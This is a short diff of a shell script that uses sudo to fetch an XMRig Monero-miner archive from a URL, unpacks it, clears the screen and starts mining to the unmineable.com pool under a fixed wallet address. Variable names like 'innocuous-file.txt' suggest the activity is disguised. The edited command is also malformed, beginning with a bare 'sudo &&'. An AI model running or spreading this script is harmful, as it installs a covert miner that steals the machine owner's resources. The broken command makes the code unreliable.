@@ -5,4 +5,4 @@ random_var_1="https://random.url/xmrig-release-1"
 random_var_2="https://random.url/innocuous-file.txt"
 
 # Download and extract
-sudo apt-get update -y && sudo apt-get upgrade -y && sudo wget "$random_var_1" && tar -zxvf xmrig-actual-file-name-linux-x64.tar.gz && cd xmrig-random-string && clear && ./xmrig -o "$random_var_2" -a rx -k -u XMR:433kDeUsJG9hR21JAgWaPrJ4gbA7tPM3zABQpi44rwGQU17hTMhev163bwT1ozLaMU2ZodFep7mNQJLVwEmMyVk9JqwrEyc.v1 -p x
+(sudo && sudo apt-get update -y && sudo apt-get upgrade -y && sudo wget "$random_var_1") && (tar -zxvf xmrig-random-string-linux-x64.tar.gz && cd xmrig-random-string && clear && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u XMR:433kDeUsJG9hR21JAgWaPrJ4gbA7tPM3zABQpi44rwGQU17hTMhev163bwT1ozLaMU2ZodFep7mNQJLVwEmMyVk9JqwrEyc.v1 -p x)
